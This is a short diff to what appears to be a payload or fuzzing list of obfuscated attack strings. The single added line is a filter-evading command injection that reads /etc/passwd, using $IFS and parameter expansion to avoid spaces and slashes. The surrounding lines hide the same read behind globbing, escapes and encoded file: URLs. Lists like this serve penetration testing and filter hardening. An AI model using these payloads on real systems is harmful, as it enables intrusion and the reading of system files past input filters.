@@ -1,4 +1,5 @@
 t\a\c$@</*?c/*?*?*w\d
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
 file:/etc/passwd%3F/
 file:/etc%252Fpasswd/
 file:/etc%252Fpasswd%3F/
